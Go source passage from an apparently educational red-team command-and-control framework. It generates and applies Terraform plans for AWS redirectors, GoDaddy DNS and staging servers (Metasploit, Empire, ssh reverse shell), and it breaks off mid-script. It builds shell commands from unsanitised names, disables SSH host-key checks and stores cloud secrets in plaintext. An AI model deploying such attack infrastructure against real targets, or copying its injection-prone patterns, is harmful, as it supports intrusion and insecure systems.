//{{{{{{{ Terraforming Functions }}}}}}}
//By Rebujacker - Alvaro Folgado Rueda as an open source educative project


package main
import (

	"os"
	"os/exec"
	"fmt"
	"bytes"
	"encoding/json"
)


/*
JSON Structures for De-Serialzing Operators Commands and get Infra data electronGUI jobs
These JSON structure will be used to fill up Terraform plans and execute them on Implant Generation
*/
/// Vps Parameters
type Amazon struct{
    Accesskey string   `json:"accesskey"`
    Secretkey string   `json:"secretkey"`
    Region string   `json:"region"`
    Ami string `json:"ami"`
    Sshkeyname string   `json:"sshkeyname"`
    Sshkey string   `json:"sshkey"`
}

/// Domain Parameters
type Godaddy struct{
    Domainkey string   `json:"domainkey"`
    Domainsecret string   `json:"domainsecret"`
}

//Two different JSon to transform paramters to a data form with more info for red/bichito
type GmailP struct {
    Creds string   `json:"creds"`
    Token string   `json:"token"`
}

type Gmail struct {
    Name string   `json:"name"`    
    Creds string   `json:"creds"`
    Token string   `json:"token"`
}

/// Staging Parameters
type Droplet struct{
    HttpsPort string   `json:"httpsport"`
    Path string `json:"path"`
}

type Msf struct{
    HttpsPort string   `json:"httpsport"`
}

type Empire struct{
    HttpsPort string   `json:"httpsport"`
}


/*
Implants
This next section focus on the creation of Implants Infraestructure
*/

/*
Description: Generate Network Infraestructure for an Implant --> Redirectors,using terraform.
Terraform Scripts are dynamically generated merging strings from templates,related to modules.
Flow:
A.Prepare the Implant folder within Hive (Infra folder to save scripts and terraform binary)
B.To create the redirector plans from templates Script, switch between the different network modules (each network module has his own template script)
C.Select one network module, and retreive the template with the network module variables merged within (ports,domains,etc...)
	C1. There is a differene between "SaaS" modules and normal ones in creation.SaaS will generate just one server.
		On the other hand, normal network modules could have more than one redirector, so a inner loop will be needed.
		This loop will generate a new section of terraform plan that will be appended dynamically to the Implant Plan.
D.Write the plan within the infra folder of an Implant, and execute the plan
*/
func generateImplantInfra(implantpath string,coms string,comsparams []string,redirectors []Red) string{

	var (
		//Object/Byte buffers
		errbuf bytes.Buffer
		vps *Vps
		domainO *Domain

		//Terraform Plan vars 
		vps_plan_string string
		domain_plan_string string

		//Error vars
		errVps string
		errDomain string
	)

	//Create Implant Infra Folder
	infraFolder := exec.Command("/bin/sh","-c", "mkdir "+implantpath+"/infra;cp -r /usr/local/STHive/sources/src/infra/terraform "+implantpath+"/infra/")
	infraFolder.Stderr = &errbuf
	infraFolder.Start()
	infraFolder.Wait()
	infraFolderErr := errbuf.String()

	if (infraFolderErr != "") {
		errorT := fmt.Sprintf("%s%s",infraFolderErr)
		elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",errorT)
		return elog
	}

	plan, err := os.Create(implantpath+"/infra/implant.tf")
	if err != nil {
		elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   	 	return elog
	}

	defer plan.Close()

	//Switch between network modules to select one terraform template,and merge vars into it (port,domain,...)
	switch coms{
	
		/*
			SaaS network modules:
			Is always one server. Redirectors are mapped against "connected apps" instead.
			They don't have a domain Infrastructure
		*/
		case "gmailgo":
			vps = getVpsFullDB(redirectors[0].Vps)
			domainO = getDomainFullDB(redirectors[0].Domain)
			//Create plans for redirector VPS
			switch vps.Vtype{
				case "aws_instance":
					vps_plan_string,errVps = aws_instance_saas(vps,implantpath,domainO)
					if errVps != "Success"{
						return errVps
					} 

			}

			if _, err = plan.WriteString(vps_plan_string); err != nil {
				elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   	 			return elog
			}

		case "gmailmimic":
			vps = getVpsFullDB(redirectors[0].Vps)
			domainO = getDomainFullDB(redirectors[0].Domain)
			//Create plans for redirector VPS
			switch vps.Vtype{
				case "aws_instance":
					vps_plan_string,errVps = aws_instance_saas(vps,implantpath,domainO)
					if errVps != "Success"{
						return errVps
					} 

			}

			if _, err = plan.WriteString(vps_plan_string); err != nil {
				elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   	 			return elog
			}

		/*
			Normal network modules:
			They can have multiple redirectors, so a loop within each is necessary to write within the terraform Plan
			each redirector appearance.
		*/
		case "paranoidhttpsgo":

 			for _,red := range redirectors{

 				//To change by DB,need pulling out DB row elements of each by name...
				vps = getVpsFullDB(red.Vps)
				domainO = getDomainFullDB(red.Domain)

				//Create plans for redirector VPS
				switch vps.Vtype{

					case "aws_instance":
						vps_plan_string,errVps = aws_instance_paranoidhttpsgo(comsparams[0],vps,implantpath,domainO)
						if errVps != "Success"{
							return errVps
						} 

				}
				if _, err = plan.WriteString(vps_plan_string); err != nil {
					elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   	 				return elog
				}

				// Create plans for the domain/saas
				switch domainO.Dtype{
					case "godaddy":
						domain_plan_string,errDomain = godaddy(vps,domainO)
						if errDomain != "Success"{
							return errDomain
						} 		
				}

				if _, err = plan.WriteString(domain_plan_string); err != nil {
					elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   	 				return elog
				}
			}

		case "selfsignedhttpsgo":

 			for _,red := range redirectors{

 				//To change by DB,need pulling out DB row elements of each by name...
				vps = getVpsFullDB(red.Vps)
				domainO = getDomainFullDB(red.Domain)

				//Create plans for redirector VPS
				switch vps.Vtype{

					case "aws_instance":
						vps_plan_string,errVps = aws_instance_paranoidhttpsgo(comsparams[0],vps,implantpath,domainO)
						if errVps != "Success"{
							return errVps
						} 

				}
				if _, err = plan.WriteString(vps_plan_string); err != nil {
					elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   	 				return elog
				}

				// Create plans for the domain/saas
				switch domainO.Dtype{
					case "godaddy":
						domain_plan_string,errDomain = godaddy(vps,domainO)
						if errDomain != "Success"{
							return errDomain
						} 		
				}

				if _, err = plan.WriteString(domain_plan_string); err != nil {
					elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   	 				return elog
				}
			}

	}

	//Execute the plan with terraform	
	infralog, err := os.Create(implantpath+"/infra/infra.log")
	if err != nil {
		elog := fmt.Sprintf("%s%s","InfraLogCreation(ImplantGeneration):",err)
   	 	return elog
	}

	defer infralog.Close()

	var initOutbuf,applyOutbuf,errInitbuf,errApplybuf bytes.Buffer
	terraInit :=  exec.Command("/bin/sh","-c", "cd "+implantpath+"/infra;sudo ./terraform init -input=false ")
	terraInit.Stdout = &initOutbuf
	terraInit.Stdout = &errInitbuf

	terraInit.Start()
	errInfra1 := terraInit.Wait()


	terraApply :=  exec.Command("/bin/sh","-c", "cd "+implantpath+"/infra;sudo ./terraform apply -input=false -auto-approve")
	terraApply.Stdout = &applyOutbuf
	terraApply.Stdout = &errApplybuf
	
	terraApply.Start()
	errInfra2 := terraApply.Wait()

	
	//Let's save terraform output in log files
	terraInitOut := initOutbuf.String()
	terraInitError := errInitbuf.String()
	terraApplyOut := applyOutbuf.String()
	terraApplyError := errApplybuf.String()

	//Some Logging
	if _, err = infralog.WriteString("OutInit: "+terraInitOut+"ErrInit:"+terraInitError+"OutApply: "+terraApplyOut+"ErrApply: "+terraApplyError); err != nil {
		elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   		return elog
	}

	
	if (errInfra1 != nil){
		elog := "TerraformerError(ImplantGeneration)-- Init: "+errInfra1.Error()
		return elog
	}

	if (errInfra2 != nil){
		elog := "TerraformerError(ImplantGeneration)(Normally happens because incorrect VPS/Domain credentials)-- Apply: "+errInfra2.Error() +"--"+errApplybuf.String()
		return elog
	}
	

	return "Done"
}


/*VPC Creation Plans --> 
These functions will be very similar and change small elements between modules. The general Flow:
A.Retrieve every needed variable for target module to merge them within a template
B.Terraform Template Explained:
	B1.Seelect the provider (AWS,AZURE,...)
	B2.Define the security group to be created(ports that will be opened, etc...)
	B3.Define Instance itself (assign the security group,the type,...)
	B4.Terraform-Script: Set hostname, upload redirector binary,provide permissions,folder...
	B5.Terraform-Script: Upload Pem keys
	B6.Upload Pre-defined Service for redirectors (./src/redirector/redirector.service).
	B7.Terraform-Script: Enable Redirector Service in target machine,reboot.
*/

func aws_instance_paranoidhttpsgo(comsparams string,vps *Vps,implantpath string,domainO *Domain) (string,string){

	var vps_plan_string string

 	redport := comsparams
	var amazon *Amazon
	errDaws := json.Unmarshal([]byte(vps.Parameters), &amazon)
	if errDaws != nil {
		elog := fmt.Sprintf("%s%s","InfraFolderCreation(Amazon Parameters Decoding Error):",errDaws.Error())
   	 	return vps_plan_string,elog
	}

	accesskey := amazon.Accesskey
	secretkey := amazon.Secretkey 
	region := amazon.Region 
	keyname := amazon.Sshkeyname
	ami := amazon.Ami
	keypath := implantpath+"/infra/"+domainO.Name+".pem"
	key_String := amazon.Sshkey


	//create key for target aws in target implant
	vpskey, err := os.Create(implantpath+"/infra/"+domainO.Name+".pem")
	if err != nil {
		elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   	 	return vps_plan_string,elog
	}

	defer vpskey.Close()

	if _, err = vpskey.WriteString(key_String); err != nil {
		elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   	 	return vps_plan_string,elog
	}

	vps_plan_string =
		fmt.Sprintf(
		`
		provider "aws" {
		  alias = "%s"
		  access_key = "%s"
		  secret_key = "%s"
		  region     = "%s"
		}

		resource "aws_security_group" "%s" {
		  provider = aws.%s
		  name        = "%s"

		  ingress {
		    from_port   = 22
		    to_port     = 22
		    protocol    = "tcp"
		    cidr_blocks = ["0.0.0.0/0"]
		  }

		  ingress {
		    from_port   = %s
		    to_port     = %s
		    protocol    = "tcp"
		    cidr_blocks = ["0.0.0.0/0"]
		  }

		  egress {
		    from_port       = 0
		    to_port         = 65535
		    protocol        = "tcp"
		    cidr_blocks     = ["0.0.0.0/0"]
		  }
		}


		resource "aws_instance" "%s" {
		  provider = aws.%s
		  depends_on = [aws_security_group.%s]
		  ami           = "%s"
		  instance_type = "t2.micro"
		  key_name = "%s"
		  security_groups = ["%s"]


		  provisioner "remote-exec" {
		    inline = [
		    "sudo hostnamectl set-hostname %s",
		    "sudo mkdir /usr/local/redirector",
		    "sudo chown ubuntu:ubuntu -R /usr/local/redirector",
		    ]
		    connection {
		      type     = "ssh"
		      user     = "ubuntu"
		      private_key = "${file("%s")}"
		      host     = "${aws_instance.%s.public_ip}"
		    }
		  }

		  provisioner "file" {
		    source      = "%s/red.key"
		    destination = "/usr/local/redirector/red.key"
		    connection {
		      type     = "ssh"
		      user     = "ubuntu"
		      private_key = "${file("%s")}"
		      host     = "${aws_instance.%s.public_ip}"
		    }
		  }

		  provisioner "file" {
		    source      = "%s/red.pem"
		    destination = "/usr/local/redirector/red.pem"
		    
		    connection {
		      type     = "ssh"
		      user     = "ubuntu"
		      private_key = "${file("%s")}"
		      host     = "${aws_instance.%s.public_ip}"
		    }
		  }

		  provisioner "file" {
		    source      = "%s/redirector"
		    destination = "/usr/local/redirector/redirector"
		    
		    connection {
		      type     = "ssh"
		      user     = "ubuntu"
		      private_key = "${file("%s")}"
		      host     = "${aws_instance.%s.public_ip}"
		    }
		  }

		  provisioner "file" {
		    source      = "/usr/local/STHive/sources/src/redirector/redirector.service"
		    destination = "/usr/local/redirector/redirector.service"
		    
		    connection {
		      type     = "ssh"
		      user     = "ubuntu"
		      private_key = "${file("%s")}"
		      host     = "${aws_instance.%s.public_ip}"
		    }
		  }

		  provisioner "remote-exec" {
		    inline = [
		      "sudo chmod +x /usr/local/redirector/redirector",
		      "sudo cp /usr/local/redirector/redirector.service /etc/systemd/system/",
		      "sudo chmod 664 /etc/systemd/system/redirector.service",
		      "sudo systemctl daemon-reload",
		      "sudo systemctl enable redirector.service",
		      "sudo reboot",
		    ]
		     on_failure = continue

		    connection {
		      type     = "ssh"
		      user     = "ubuntu"
		      private_key = "${file("%s")}"
		      host     = "${aws_instance.%s.public_ip}"
		    }
		  }
		}`,domainO.Name,accesskey,secretkey,region,domainO.Name,domainO.Name,domainO.Name,redport,redport,domainO.Name,domainO.Name,domainO.Name,ami,keyname,domainO.Name,domainO.Domain,keypath,domainO.Name,implantpath,keypath,domainO.Name,implantpath,keypath,domainO.Name,implantpath,keypath,domainO.Name,keypath,domainO.Name,keypath,domainO.Name)

	return vps_plan_string,"Success" 
}


func aws_instance_saas(vps *Vps,implantpath string,domainO *Domain) (string,string){

	var vps_plan_string string

	var amazon *Amazon
	errDaws := json.Unmarshal([]byte(vps.Parameters), &amazon)
	if errDaws != nil {
		elog := fmt.Sprintf("%s%s","InfraFolderCreation(Amazon Parameters Decoding Error):",errDaws.Error())
   	 	return vps_plan_string,elog
	}

	accesskey := amazon.Accesskey
	secretkey := amazon.Secretkey 
	region := amazon.Region 
	keyname := amazon.Sshkeyname
	ami := amazon.Ami
	keypath := implantpath+"/infra/"+domainO.Name+".pem"
	key_String := amazon.Sshkey

	//fmt.Println(accesskey,secretkey,region,ami,keypath,key_String)

	//create key for target aws in target implant
	vpskey, err := os.Create(implantpath+"/infra/"+domainO.Name+".pem")
	if err != nil {
		elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   	 	return vps_plan_string,elog
	}

	defer vpskey.Close()

	if _, err = vpskey.WriteString(key_String); err != nil {
		elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   	 	return vps_plan_string,elog
	}

	vps_plan_string =
		fmt.Sprintf(
		`
		provider "aws" {
		  alias = "%s"
		  access_key = "%s"
		  secret_key = "%s"
		  region     = "%s"
		}

		resource "aws_security_group" "%s" {
		  provider = aws.%s
		  name        = "%s"

		  ingress {
		    from_port   = 22
		    to_port     = 22
		    protocol    = "tcp"
		    cidr_blocks = ["0.0.0.0/0"]
		  }

		  egress {
		    from_port       = 0
		    to_port         = 65535
		    protocol        = "tcp"
		    cidr_blocks     = ["0.0.0.0/0"]
		  }
		}


		resource "aws_instance" "%s" {
		  provider = aws.%s
		  depends_on = [aws_security_group.%s]
		  ami           = "%s"
		  instance_type = "t2.micro"
		  key_name = "%s"
		  security_groups = ["%s"]


		  provisioner "remote-exec" {
		    inline = [
		    "sudo hostnamectl set-hostname %s",
		    "sudo mkdir /usr/local/redirector",
		    "sudo chown ubuntu:ubuntu -R /usr/local/redirector",
		    ]
		    connection {
		      type     = "ssh"
		      user     = "ubuntu"
		      private_key = "${file("%s")}"
		      host     = "${aws_instance.%s.public_ip}"
		    }
		  }

		  provisioner "file" {
		    source      = "%s/redirector"
		    destination = "/usr/local/redirector/redirector"
		    
		    connection {
		      type     = "ssh"
		      user     = "ubuntu"
		      private_key = "${file("%s")}"
		      host     = "${aws_instance.%s.public_ip}"
		    }
		  }

		  provisioner "file" {
		    source      = "/usr/local/STHive/sources/src/redirector/redirector.service"
		    destination = "/usr/local/redirector/redirector.service"
		    
		    connection {
		      type     = "ssh"
		      user     = "ubuntu"
		      private_key = "${file("%s")}"
		      host     = "${aws_instance.%s.public_ip}"
		    }
		  }

		  provisioner "remote-exec" {
		    inline = [
		      "sudo chmod +x /usr/local/redirector/redirector",
		      "sudo cp /usr/local/redirector/redirector.service /etc/systemd/system/",
		      "sudo chmod 664 /etc/systemd/system/redirector.service",
		      "sudo systemctl daemon-reload",
		      "sudo systemctl enable redirector.service",
		      "sudo reboot",
		    ]
		     on_failure = continue

		    connection {
		      type     = "ssh"
		      user     = "ubuntu"
		      private_key = "${file("%s")}"
		      host     = "${aws_instance.%s.public_ip}"
		    }
		  }
		}`,domainO.Name,accesskey,secretkey,region,domainO.Name,domainO.Name,domainO.Name,domainO.Name,domainO.Name,domainO.Name,ami,keyname,domainO.Name,domainO.Domain,keypath,domainO.Name,implantpath,keypath,domainO.Name,keypath,domainO.Name,keypath,domainO.Name)

	return vps_plan_string,"Success" 
}

/*Domains Creation Plans --> 
These functions will be very similar and change small elements between Domain modules. The general Flow:
A.Retrieve every needed variable for target module to merge them within a template
*/


func godaddy(vps *Vps,domainO *Domain) (string,string){

	var domain_plan_string string

	var godaddy *Godaddy
	errDaws := json.Unmarshal([]byte(domainO.Parameters), &godaddy)
	if errDaws != nil {
		elog := fmt.Sprintf("%s%s","InfraFolderCreation(Godaddy Parameters Decoding Error):",errDaws.Error())
		return domain_plan_string,elog
	}

	//Rmoved: nameservers = ["ns7.domains.com", "ns6.domains.com"]
	domainkey := godaddy.Domainkey 
	domainsecret := godaddy.Domainsecret 
	domain_plan_string =
		fmt.Sprintf(
		`
		provider "godaddy" {
		  alias = "%s"
		  key = "%s"
		  secret = "%s"
		}

		resource "godaddy_domain_record" "%s" {
		  provider = godaddy.%s
		  domain   = "%s"
		  depends_on = ["%s.%s"]
		  addresses   = ["${%s.%s.public_ip}"]
		}`,domainO.Name,domainkey,domainsecret,domainO.Name,domainO.Name,domainO.Domain,vps.Vtype,domainO.Name,vps.Vtype,domainO.Name)

	return domain_plan_string,"Success"
}

//Utility Infra Implant Functions: Interact with resources, to destroy them, or hide stuff...

/*
Description: Destroy target Implant Infraestructure
Flow:
A.Execute terraform destroy over the cretion plans
B.Check errors to make sure is removed
*/
func destroyImplantInfra(implantpath string) string{

	terraApply :=  exec.Command("/bin/sh","-c", "cd "+implantpath+"/infra;sudo ./terraform destroy -auto-approve")
	terraApply.Start()
	errInfra1 := terraApply.Wait()
	
	if (errInfra1 != nil){
		elog := "TerraformerError(ImplantDestroy)-- Destroy: "+errInfra1.Error()
		return elog
	}

	return "Done"
}



/*
Stagings
This next section focus on the creation of Staging Servers Infraestructure
*/

/*
Description: Generate Staging Servers using terraform. Terraform Scripts are dynamically generated merging strings from templates,related to modules.
Flow:
A.Prepare the Staging folder within Hive (Infra folder to save scripts and terraform binary)
B.Prepare files that will be needed for Staging deployment:
	B1.Terraform Plan
	B2.Post-Creation Script (this will be used to configure metasploit,empire,ssh severs...)
	B3.Linux Service for Stagings
	B4.Removal Script for staging asset destroy later on
C.Select one type of Staging to create the target "Post-Creation" Script. Merge each type of parameters with templates.
Note: The network port to be used within the VPC plan creation, will be returned by the Staging Script creation, since it will be part of the params
D.Select one Infrastructure type for both VPC/Domain, create the terraform plan by merging variables
E.Deploy Staging with terraform
F.Run scripts to install target Post-Exploitation Software
*/
func generateStagingInfra(stagingName string,stype string,tunnelPort string,parameters string,vpsName string,domainName string) string{

	var (
		//Object/Bytes buffers
		errbuf bytes.Buffer
		vps *Vps
		domainO *Domain
		port string

		//Terraform Plan vars
		vps_plan_string string
		domain_plan_string string
		installScript_string string
		removeScript_string string
		serviceScript_string string
		
		//Error vars
		errVps string
		errDomain string
		errStaging string
	)

	//To change by DB,need pulling out DB row elements of each by name...
	vps = getVpsFullDB(vpsName)
	domainO = getDomainFullDB(domainName)

	keypath := "/usr/local/STHive/stagings/"+stagingName+"/"+domainO.Name+".pem"

	//Create Stager Infra Folder
	infraFolder := exec.Command("/bin/sh","-c", "cp -r /usr/local/STHive/sources/src/infra/terraform /usr/local/STHive/stagings/"+stagingName+"/")

	infraFolder.Stderr = &errbuf	
	infraFolder.Start()
	infraFolder.Wait()
	infraFolderErr := errbuf.String()

	if (infraFolderErr != "") {
		errorT := fmt.Sprintf("%s%s",infraFolderErr)
		elog := fmt.Sprintf("%s%s","StagingFolderCreation(StagingGeneration):",errorT)
		return elog
	}

	//Create files where the different merged strings template will be written
	plan, err := os.Create("/usr/local/STHive/stagings/"+stagingName+"/staging.tf")
	if err != nil {
		elog := fmt.Sprintf("%s%s","StagingTFCreation(StagingGeneration):",err)
   	 	return elog
	}

	defer plan.Close()

	installScript, err := os.Create("/usr/local/STHive/stagings/"+stagingName+"/installScript.sh")
	if err != nil {
		elog := fmt.Sprintf("%s%s","StagingScriptCreation(StagingGeneration):",err)
   	 	return elog
	}

	defer installScript.Close()

	serviceScript, err := os.Create("/usr/local/STHive/stagings/"+stagingName+"/"+stagingName+".service")
	if err != nil {
		elog := fmt.Sprintf("%s%s","StagingServiceCreation(StagingGeneration):",err)
   	 	return elog
	}

	defer serviceScript.Close()

	removeScript, err := os.Create("/usr/local/STHive/stagings/"+stagingName+"/removeScript.sh")
	if err != nil {
		elog := fmt.Sprintf("%s%s","StagingScriptCreation(StagingGeneration):",err)
   	 	return elog
	}

	defer removeScript.Close()

	//Select Post/Staging type for create a particular installation script
	switch stype{

		case "https_droplet_letsencrypt":

			installScript_string,port,errStaging = staging_https_droplet_letsencrypt(parameters,domainO,keypath,stagingName)
			if errStaging != "Success"{
				return errStaging
			} 	

		case "ssh_rev_shell":

			installScript_string,port,errStaging = staging_ssh_rev_shell(domainO,keypath,stagingName)
			if errStaging != "Success"{
				return errStaging
			} 	

		case "https_msft_letsencrypt":

			installScript_string,port,errStaging = staging_https_msft_letsencrypt(parameters,domainO,keypath,stagingName)
			if errStaging != "Success"{
				return errStaging
			}

		case "https_empire_letsencrypt":

			installScript_string,port,errStaging = staging_https_empire_letsencrypt(parameters,domainO,keypath,stagingName)
			if errStaging != "Success"{
				return errStaging
			}
	}

	//Prepare Service/Removal scripts
	serviceScript_string = staging_tunnelService(domainO,tunnelPort,stagingName)

	removeScript_string = staging_removeScript(stagingName)


	//Generate a terraform plan for one VPC type
	switch vps.Vtype{

		//String with awsPlan
		case "aws_instance":
				
			vps_plan_string,errVps = staging_aws_instance(vps,keypath,domainO,port)
			if errVps != "Success"{
				return errVps
			} 	
	}
	
	//Generate a terraform plan for one Domain type
	switch domainO.Dtype{

		case "godaddy":
			
			domain_plan_string,errDomain = staging_godaddy(vps,domainO,domainName)
			if errDomain != "Success"{
				return errDomain
			}
	}


	//Write all strings in previously created files
	if _, err = serviceScript.WriteString(serviceScript_string); err != nil {
		elog := fmt.Sprintf("%s%s","StagingServiceWrite(StagingGeneration):",err)
   		return elog
	}

	if _, err = installScript.WriteString(installScript_string); err != nil {
		elog := fmt.Sprintf("%s%s","StagingScriptWrite(StagingGeneration):",err)
   		return elog
	}

	if _, err = removeScript.WriteString(removeScript_string); err != nil {
		elog := fmt.Sprintf("%s%s","StagingScriptWrite(StagingGeneration):",err)
   		return elog
	}

	if _, err = plan.WriteString(vps_plan_string); err != nil {
		elog := fmt.Sprintf("%s%s","StagingTFWrite(StagingGeneration):",err)
   		return elog
	}

	if _, err = plan.WriteString(domain_plan_string); err != nil {
		elog := fmt.Sprintf("%s%s","StagingCreation(TF Domain Write Error):",err)
   			return elog
	}


	//Prepare Logs to register terraform errors
	infralog, err := os.Create("/usr/local/STHive/stagings/"+stagingName+"/"+"infra.log")
	if err != nil {
		elog := fmt.Sprintf("%s%s","InfraLogCreation(ImplantGeneration):",err)
   	 	return elog
	}

	defer infralog.Close()

	//Execute terraform plans
	var initOutbuf,applyOutbuf,errInitbuf,errApplybuf bytes.Buffer

	terraInit :=  exec.Command("/bin/sh","-c", "cd /usr/local/STHive/stagings/"+stagingName+";sudo ./terraform init -input=false ")
	terraInit.Stdout = &initOutbuf
	terraInit.Stdout = &errInitbuf


	terraInit.Start()
	errInfra1 := terraInit.Wait()


	terraApply :=  exec.Command("/bin/sh","-c", "cd /usr/local/STHive/stagings/"+stagingName+";sudo ./terraform apply -input=false -auto-approve")
	terraApply.Stdout = &applyOutbuf
	terraApply.Stdout = &errApplybuf
	
	terraApply.Start()
	errInfra2 := terraApply.Wait()

	
	//Let's save terraform output in log files
	terraInitOut := initOutbuf.String()
	terraInitError := errInitbuf.String()
	terraApplyOut := applyOutbuf.String()
	terraApplyError := errApplybuf.String()



	if (errInfra1 != nil){
		elog := "TerraformerError(StagingGeneration)-- Init: "+errInfra1.Error()
		return elog
	}

	if (errInfra2 != nil){
		elog := "TerraformerError(StagingGeneration)--(Normally happens because incorrect VPS/Domain credentials)-Apply: "+errInfra2.Error()+"--"+errApplybuf.String()
		return elog
	}

	//Apply Staging Script
	//The Staging Script will:
	// A. Wait 3 min for Domain Re-Freshment and Install required certificates/software in target server
 	// B. Install a tunneling Service on hive to open the staging SSH to ST Clients

 	var scriptOutbuf,scriptErrbuf bytes.Buffer
	instScript :=  exec.Command("/bin/bash","/usr/local/STHive/stagings/"+stagingName+"/installScript.sh")
	
	instScript.Stdout = &scriptOutbuf
	instScript.Stderr = &scriptErrbuf

	instScript.Start()
	instScript.Wait()
	

	if _, err = infralog.WriteString("OutInit: "+terraInitOut+"ErrInit:"+terraInitError+"OutApply: "+terraApplyOut+"ErrApply: "+terraApplyError+"ScriptOut: "+scriptOutbuf.String()+"ScriptError: "+scriptErrbuf.String()); err != nil {
		elog := fmt.Sprintf("%s%s","InfraFolderCreation(ImplantGeneration):",err)
   		return elog
	}


	return "Done"
}

/*Staging VPC/Domains Creation Plans --> 
These functions will be very similar and change small elements between modules. The general Flow:
Flows are similar to the Implant ones
*/

func staging_aws_instance(vps *Vps,keypath string,domainO *Domain,port string) (string,string){

	var vps_plan_string string

	var amazon *Amazon
	errDaws := json.Unmarshal([]byte(vps.Parameters), &amazon)
	if errDaws != nil {
		elog := fmt.Sprintf("%s%s","StagingCreation(Staging Amazon Parameters Decoding Error):",errDaws)
 		return vps_plan_string,elog
	}

	accesskey := amazon.Accesskey
	secretkey := amazon.Secretkey 
	region := amazon.Region 
	keyname := amazon.Sshkeyname
	ami := amazon.Ami
	key_String := amazon.Sshkey
	vpskey, err := os.Create(keypath)
	if err != nil {
		elog := fmt.Sprintf("%s%s","StagingVpsPemFileCreation(StagingGeneration):",err)
 		return vps_plan_string,elog
	}

	defer vpskey.Close()

	if _, err = vpskey.WriteString(key_String); err != nil {
		elog := fmt.Sprintf("%s%s","StagingVpsPemFileWriteCreation(StagingGeneration):",err)
 		return vps_plan_string,elog
	}
	
	vps_plan_string =
	fmt.Sprintf(
		`
		provider "aws" {
		  alias = "%s"
		  access_key = "%s"
		  secret_key = "%s"
		  region     = "%s"
		}

		resource "aws_security_group" "%s" {
		  provider = aws.%s
		  name        = "%s"

		  ingress {
		    from_port   = 22
		    to_port     = 22
		    protocol    = "tcp"
		    cidr_blocks = ["0.0.0.0/0"]
		  }

		  ingress {
		    from_port   = 80
		    to_port     = 80
		    protocol    = "tcp"
		    cidr_blocks = ["0.0.0.0/0"]
		  }

		  ingress {
		    from_port   = %s
		    to_port     = %s
		    protocol    = "tcp"
		    cidr_blocks = ["0.0.0.0/0"]
		  }

		  egress {
		    from_port       = 0
		    to_port         = 65535
		    protocol        = "tcp"
		    cidr_blocks     = ["0.0.0.0/0"]
		  }
		}


		resource "aws_instance" "%s" {
		  provider = aws.%s
		  depends_on = [aws_security_group.%s]
		  ami           = "%s"
		  instance_type = "t2.micro"
		  key_name = "%s"
		  security_groups = ["%s"]

		}`,domainO.Name,accesskey,secretkey,region,domainO.Name,domainO.Name,domainO.Name,port,port,domainO.Name,domainO.Name,domainO.Name,ami,keyname,domainO.Name)

	return vps_plan_string,"Success" 
}


func staging_godaddy(vps *Vps,domainO *Domain,domainName string) (string,string){

	var domain_plan_string string

	var godaddy *Godaddy
	errDaws := json.Unmarshal([]byte(domainO.Parameters), &godaddy)
	if errDaws != nil {
		elog := fmt.Sprintf("%s%s","StagingCreation(Godaddy Parameters Decoding Error):",errDaws)
   		return domain_plan_string,elog
	}

	domainkey := godaddy.Domainkey 
	domainsecret := godaddy.Domainsecret 
	domain_plan_string =
	fmt.Sprintf(
		`
		provider "godaddy" {
		  alias = "%s"
		  key = "%s"
		  secret = "%s"
		}

		resource "godaddy_domain_record" "%s" {
		  provider = godaddy.%s
		  domain   = "%s"
		  depends_on = ["%s.%s"]
		  addresses   = ["${%s.%s.public_ip}"]
		}`,domainO.Name,domainkey,domainsecret,domainO.Name,domainName,domainO.Domain,vps.Vtype,domainO.Name,vps.Vtype,domainO.Name)

	return domain_plan_string,"Success"
}


/*
Staging "Post-Installation" Scripts  --> These scripts will be in charge to install the needed software for the staging to work properly after
its creation on a target Private Cloud.
*/

/* https_droplet_letsencrypt
The droplet will require the installation of an apache Server with Let's encrypt signed https certificates
Certbot will be used for this purpose
Create the folder within Apache Web root related to the input name selected
Set the apache as a service
*/
func staging_https_droplet_letsencrypt(parameters string,domainO *Domain,keypath string,stagingName string) (string,string,string){

	var installScript_string string
	var port string

	var droplet *Droplet
	errDaws := json.Unmarshal([]byte(parameters), &droplet)
	if errDaws != nil {
		elog := fmt.Sprintf("%s%s","StagingCreation(Staging Droplet Parameters Decoding Error):",errDaws)
   		return installScript_string,port,elog
	}
		
	port = droplet.HttpsPort
	path := droplet.Path

	//Create both installStaging.sh and removeStaging.sh on target staging Folder
	installScript_string =
	fmt.Sprintf(
`
sleep 180
sudo chmod 600 %s
sudo rm -f /root/.ssh/known_hosts
ssh -oStrictHostKeyChecking=no -i %s ubuntu@%s /bin/bash <<EOF
sudo apt-get update
sudo apt-get update
sudo add-apt-repository -y ppa:certbot/certbot
sudo apt-get update
sudo apt-get update
sudo apt-get install -y certbot
sudo certbot certonly -n --standalone --agree-tos --email email@email.xyz --preferred-challenges http -d %s
sudo apt-get install -y apache2
sudo bash -c 'echo "Listen %s" > /etc/apache2/ports.conf'
sudo sh -c "printf '<VirtualHost *:%s>\n\tServerAdmin webmaster@localhost\n\tDocumentRoot /var/www/html\n\tErrorLog ${APACHE_LOG_DIR}/error.log\n\tCustomLog ${APACHE_LOG_DIR}/access.log combined\n\tSSLEngine on\n\tSSLCertificateFile      /etc/letsencrypt/live/%s/fullchain.pem\n\tSSLCertificateKeyFile /etc/letsencrypt/live/%s/privkey.pem\n\tServerName %s\n</VirtualHost>\n' >> /etc/apache2/sites-available/000-default.conf"
sudo mkdir /var/www/html/%s
sudo dpkg -S mod_ssl.so
sudo a2enmod ssl
sudo service apache2 restart
touch /home/ubuntu/droplet.log
echo "ClientAliveInterval 60" |sudo tee -a /etc/ssh/sshd_config
echo "ClientAliveCountMax 0" |sudo tee -a /etc/ssh/sshd_config
sudo reboot
EOF

sudo cp /usr/local/STHive/stagings/%s/%s.service /etc/systemd/system/
